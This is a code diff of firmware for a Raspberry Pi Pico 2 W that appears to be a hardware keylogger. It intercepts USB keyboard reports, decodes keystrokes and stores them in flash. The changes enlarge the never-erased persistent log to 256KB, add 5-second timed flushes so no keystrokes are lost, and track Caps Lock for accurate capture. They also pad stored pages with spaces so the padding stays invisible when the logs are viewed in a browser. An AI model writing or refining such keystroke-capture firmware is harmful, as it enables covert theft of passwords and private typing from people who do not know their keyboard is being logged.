@@ -1,4 +1,4 @@
-﻿#include <string.h>
+#include <string.h>
 #include <stdio.h>
 #include "pico/stdlib.h"
 #include "pico/multicore.h"
@@ -10,16 +10,16 @@
 
 //--------------------------------------------------------------------+
 // Flash layout (Pico 2 W = 4MB flash)
-// Last 520KB reserved:
-//   [CONFIG  4KB] [PERSIST  4KB] [CIRCULAR 512KB]
+// Last 516KB reserved:
+//   [CONFIG 4KB] [PERSIST 256KB] [CIRCULAR 256KB]
 //
 //   0x37E000 - 0x37EFFF : Config sector  (4KB)
-//   0x37F000 - 0x37FFFF : Persistent zone (4KB) - first ~200 words, never auto-erased
-//   0x380000 - 0x3FFFFF : Circular capture buffer (512KB)
+//   0x37F000 - 0x3BEFFF : Persistent zone (256KB) - 50% split, never auto-erased
+//   0x3BF000 - 0x3FFFFF : Circular capture buffer (256KB) - 50% split, overwrites itself
 //--------------------------------------------------------------------+
 #define FLASH_TOTAL            (4 * 1024 * 1024)
-#define FLASH_CAPTURE_SIZE     (512 * 1024)                // 512 KB circular
-#define FLASH_PERSIST_SIZE     FLASH_SECTOR_SIZE           // 4 KB persist zone
+#define FLASH_CAPTURE_SIZE     (256 * 1024)                // 256 KB circular
+#define FLASH_PERSIST_SIZE     (256 * 1024)                // 256 KB persist zone
 #define FLASH_CONFIG_SIZE      FLASH_SECTOR_SIZE           // 4 KB config
 // Offsets from flash base (0):
 #define FLASH_CONFIG_OFFSET    (FLASH_TOTAL - FLASH_CAPTURE_SIZE - FLASH_PERSIST_SIZE - FLASH_CONFIG_SIZE)
@@ -34,9 +34,8 @@
 // Config magic to detect a valid configuration sector
 #define CONFIG_MAGIC 0xDEADBEEF
 
-// Stop writing to persist zone after this many bytes (~200 words @ avg 6 chars/word)
-// 2048 bytes is conservative - leaves the other 2KB of the 4KB sector as headroom
-#define PERSIST_THRESHOLD  2048
+// Stop writing to persist zone when it's full (reserve 1 page for safety)
+#define PERSIST_THRESHOLD  (FLASH_PERSIST_SIZE - FLASH_PAGE_SIZE)
 
 typedef struct {
     uint32_t magic;
@@ -66,6 +65,7 @@ static char g_size_str[32];
 
 // Track capture-mode transitions for edge detection
 static bool g_was_active = false;
+static bool g_caps_lock = false;
 
 //--------------------------------------------------------------------+
 // HID keycode → ASCII table (from TinyUSB)
@@ -113,9 +113,9 @@ static void save_config(void) {
 //--------------------------------------------------------------------+
 static void flush_persist_to_flash(void) {
     if (g_persist_ram_used == 0) return;
-    // Pad to full page with 0xFF (harmless - unwritten flash is already 0xFF)
+    // Pad to full page with space (' ') so any leaked padding is invisible in browser
     if (g_persist_ram_used < FLASH_PAGE_SIZE) {
-        memset(g_persist_ram_buf + g_persist_ram_used, 0xFF,
+        memset(g_persist_ram_buf + g_persist_ram_used, ' ',
                FLASH_PAGE_SIZE - g_persist_ram_used);
     }
     flash_safe_program(FLASH_PERSIST_OFFSET + g_persist_flash_ptr,
@@ -130,10 +130,10 @@ static void flush_persist_to_flash(void) {
 static void flush_ram_to_flash(void) {
     if (g_ram_used == 0) return;
 
-    // Pad to a full page boundary
+    // Pad to a full page boundary with space
     uint32_t pad = FLASH_PAGE_SIZE - (g_ram_used % FLASH_PAGE_SIZE);
     if (pad < FLASH_PAGE_SIZE) {
-        memset(g_ram_buf + g_ram_used, 0xFF, pad);
+        memset(g_ram_buf + g_ram_used, ' ', pad);
         g_ram_used += pad;
     }
 
@@ -215,14 +215,34 @@ uint32_t capture_get_total(void) {
 }
 
 void capture_task(void) {
-    // Flush persist RAM when it fills up (256 bytes = one page)
-    if (!g_persist_full && g_persist_ram_used >= PERSIST_RAM_SIZE) {
-        flush_persist_to_flash();
-        save_config();
+    uint32_t now = to_ms_since_boot(get_absolute_time());
+    static uint32_t last_flush_ms = 0;
+    bool time_to_flush = (now - last_flush_ms >= 5000);
+    bool flushed_anything = false;
+
+    // Flush persist RAM to flash when full OR after 5s of inactivity
+    if (!g_persist_full && g_persist_ram_used > 0) {
+        if ((g_persist_ram_used >= PERSIST_RAM_SIZE) || time_to_flush) {
+            flush_persist_to_flash();
+            save_config(); // Config must be saved so we know where we left off
+            flushed_anything = true;
+        }
     }
-    // Flush circular RAM buffer to flash when 75% full
-    if (g_ram_used >= (RAM_BUF_SIZE * 3 / 4)) {
-        flush_ram_to_flash();
+
+    // Flush circular RAM buffer to flash when 75% full OR after 5s of inactivity
+    if (g_ram_used > 0) {
+        if ((g_ram_used >= (RAM_BUF_SIZE * 3 / 4)) || time_to_flush) {
+            flush_ram_to_flash();
+            // flush_ram_to_flash() automatically calls save_config() inside it
+            flushed_anything = true;
+        }
+    }
+
+    // Reset inactivity timer if we just flushed, OR if there's no pending data at all
+    if (flushed_anything) {
+        last_flush_ms = now;
+    } else if ((g_persist_full || g_persist_ram_used == 0) && g_ram_used == 0) {
+        last_flush_ms = now;
     }
 }
 
@@ -294,7 +314,10 @@ void capture_record_report(hid_keyboard_report_t const *report) {
             case HID_KEY_BACKSPACE:   special = "[BS]";    break;
             case HID_KEY_TAB:         special = "[TAB]";   break;
             case HID_KEY_SPACE:       special = " ";       break;
-            case HID_KEY_CAPS_LOCK:   special = "[CAPS]";  break;
+            case HID_KEY_CAPS_LOCK:   
+                special = "[CAPS]";  
+                g_caps_lock = !g_caps_lock; // Track caps state internally
+                break;
             case HID_KEY_ARROW_RIGHT: special = "[RIGHT]"; break;
             case HID_KEY_ARROW_LEFT:  special = "[LEFT]";  break;
             case HID_KEY_ARROW_DOWN:  special = "[DOWN]";  break;
@@ -325,6 +348,14 @@ void capture_record_report(hid_keyboard_report_t const *report) {
         } else if (kc < 128) {
             bool shift = report->modifier & (KEYBOARD_MODIFIER_LEFTSHIFT | KEYBOARD_MODIFIER_RIGHTSHIFT);
             uint8_t ch = keycode2ascii[kc][shift ? 1 : 0];
+            
+            // Apply CAPS LOCK inversion for alphabetical characters
+            if (g_caps_lock && ch >= 'a' && ch <= 'z') {
+                ch = ch - 32; // to uppercase
+            } else if (g_caps_lock && ch >= 'A' && ch <= 'Z') {
+                ch = ch + 32; // to lowercase
+            }
+            
             if (ch) capture_store_byte(ch);
         }
     }
@@ -412,7 +443,9 @@ void capture_clear(void) {
 
 // Erase only the persistent zone - circular buffer untouched
 void capture_clear_persist(void) {
-    flash_safe_erase_sector(FLASH_PERSIST_OFFSET);
+    for (uint32_t off = 0; off < FLASH_PERSIST_SIZE; off += FLASH_SECTOR_SIZE) {
+        flash_safe_erase_sector(FLASH_PERSIST_OFFSET + off);
+    }
     g_persist_flash_ptr = 0;
     g_persist_ram_used  = 0;
     g_persist_full      = false;
